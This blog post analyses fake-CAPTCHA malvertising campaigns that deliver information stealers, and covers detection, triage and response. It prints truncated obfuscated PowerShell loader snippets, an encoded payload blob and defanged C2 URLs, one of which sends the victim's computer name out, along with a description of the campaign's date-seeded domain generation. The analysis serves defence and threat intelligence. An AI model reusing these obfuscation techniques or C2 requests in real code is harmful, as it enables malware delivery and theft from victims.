---
title: "Fake CAPTCHAs: How Attackers Are Using Them to Spread Malware"
date: 2025-05-02 00:00:00 +0800
categories: [Articles]
tags: [Cyber Stuff]
---

Over the past 4 months within 2025, there has been a sharp rise in cybercriminals using fake CAPTCHA pages as a social engineering tactic to distribute malware, particularly information stealers like Lumma Stealer.

In this post, I want to break down how these fake CAPTCHA campaigns work, how they can be detected, and what a good response looks like.

## Attack Flow

The flowchart below illustrates the attack chain of a fake CAPTCHA malvertising campaign, where users are tricked into executing a malicious command. This leads to the download and execution of obfuscated malware.

![ClickFix - Fake CAPTCHA Attack Flow](https://www.triskelelabs.com/hs-fs/hubfs/ClickFix%20-%20Fake%20CAPTCHA%20Attack%20Flow-01.png?width=5334&height=3000&name=ClickFix%20-%20Fake%20CAPTCHA%20Attack%20Flow-01.png)

## Findings

Two related commands were identified containing heavily obfuscated PowerShell. Although the full payload was not included here, the scripts were consistent with malware delivery and appeared to be associated with an information stealer, likely StealC.

### Obfuscated PowerShell Scripts

The scripts used several layers of obfuscation, including arithmetic-based string generation, encoded payloads, compressed data blobs, and indirect execution with reflection. Snippets of these scripts included:

```Snippet of 1st Script
$xtrvndwblhkco=$executioncontext;$atedatatedesantionisaraloralenes = (-joIn (@((-838+(6369-(3626436/(-2638+3300)))),(349908/6729),(7048-6991),(10121-(900+(2956+6215))),(-4013+(2422+(-6051+(9845-2147)))),(4888-(5742792/(-1112+2300))),(1536-(9147-(14077-6410))),(-5083+(-977+(5216+899))),(1116-1061),(4361-4311),(986-(9486930/10201)),(401904/(16478064/(2454-486))),(31703/647),(-4628+(9186-(7004-2501))),(3346-(9644-6350)),(6976-6920),(237492/4398),(5456-(10392-4992)),(1384-1328),(-4377+4426),(394-(6451-6111)),(9128-(44171568/4869)),(-7143+(16118-(16520-(41488400/5459)))),(3312-3260),(-4520+4575),(161700/(9841-(10276-3669))),(-6436+6492),(111072/2314),(9380-9325),(4511-(11119-(1613+5045))),(1871-1815),(-7642+(10139-2448)),(-1504+(4240-(13590280/5071))),(-1757+(2814036/(4288-2735))),(3305-3256),(4654-(9227-4628)),(-8978+9029),(381726/7069),(501928/(53025108/(-2861+8777))),(-2041+(2455-(4094-3736))),(8299-(21398828/2596)),(-5782+5837),(3138-3082),(7455-7405),(-4219+(4355-80)),(3015-2967),(-6060+6114),(6700-(13454100/2025)),(360808/(5832+(7834-7223))),(336655/(19073036/(-1705+4821))),(170885/(-1273+4380)),(445662/(81465363/(19013-9142))),
```
```Snippet of 2nd Script
[System.Text.Encoding]::ascii.(([char[]]@((4326-(25704455/(977+(6670-1606)))),(7200-7099),(219008/(7615-5727)),(2740-2657),(1147-1031),(8706-(6452592/(-5601+6352))),(778470/(32977472/(4294+154))),(-5707+(15977-10160)),(41612/404)) -join ''))((h8ndqpv76xz1jykoi20bgu3wt9e "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
```


### Deobfuscation Results

Analysis of the scripts identified communication with the following suspected command-and-control (C2) endpoint:

```text
hxxps://urjmovmstbtkamj[.]top/1.php?s=527
```

A second request was also observed at:

```text
hxxp://urjmovmstbtkamj[.]top/dfql2whrag.php?id=$env:computername&key=snrljndkqk&s=527
```

This second request appears to collect host information, including the computer name. The parameters may indicate the following:

- `$env:computername`: The affected asset name
- `key=snrljndkqk`: A potential identifier for the infected asset in the C2 database
- `s=527`: A possible campaign identifier or payload version

The C2 infrastructure appeared to use a Domain Generation Algorithm (DGA). The seed was based on the current date and a hard-coded value (`yyyyMMdd + 8441`), which would allow the generated domain to change daily. A Dynamic DNS service was also used to rotate the domain associated with the infrastructure.

Initial observations suggested MintsLoader activity, potentially leading to the deployment of StealC or another information-stealing payload.

## Initial Access Vectors

Attackers primarily rely on malvertising - embedding malicious ads or exploiting compromised legitimate websites to redirect unsuspecting users to fraudulent CAPTCHA pages. These pages instruct users to complete a fake “verification” process.

Other tactics I've observed include exploiting browser vulnerabilities with JavaScript to trigger unauthorised downloads, intrusive push notifications, and phishing emails with malicious links that funnel users toward the same fake CAPTCHA pages.

The image below shows how one of these campaigns deceives users into executing a malicious command via the Windows Run dialog, disguised as CAPTCHA verification.

![reCAPTCHA — Requesting user to run commands as part of CAPTCHA verification](https://www.triskelelabs.com/hs-fs/hubfs/recaptcha.webp?width=728&height=380&name=recaptcha.webp)

## Detection Methods

There are a few methods that work well for catching this kind of activity, most of which start with SIEM and XDR/EDR alerts, backed by custom detection rules for suspicious commands and processes:

- Behavioural analysis and anomaly detection, watching for unusual user activity, like running suspicious commands or downloading unknown files.
- URL and domain reputation monitoring - flagging and restricting access to newly registered or suspicious domains tied to fake CAPTCHA campaigns.
- Network traffic analysis, keeping an eye on DNS requests and other network activity for suspicious inbound/outbound communication linked to these attacks.

## Triage Steps

When an alert like this fires, here's how I'd go about validating whether it's genuine:

1. Commandline analysis - Investigate the script for signs of obfuscation, encoding, unintelligible arguments or unusual execution methods. Where a command's intent isn't obvious, sandbox tools help assess its behaviour, including any network communications it triggers.
2. Network Pivoting - Review logs from roughly two minutes before and after the malicious command, focusing on the process used to initiate the malware (for example, powershell.exe, cmd.exe, mshta.exe, etc.) and check for inbound and outbound connections for network activity.
3. Contextual validation - Check whether the activity fits the user's role. Someone in payroll running advanced system commands is a lot more suspicious than an IT admin doing the same thing.

## Recommended Response Actions

If an investigation confirms a true positive, here's what I'd recommend doing:

- Isolate the affected asset immediately to stop malware propagation or further external communication.
- If the associated user account shows signs of compromise, disable it right away.
- Consider a full wipe and reimage of the affected system as a precaution.
- Document and share indicators of compromise (IOCs) like suspicious IPs, file hashes, domains to help the community for broader threat intelligence and detection tuning.
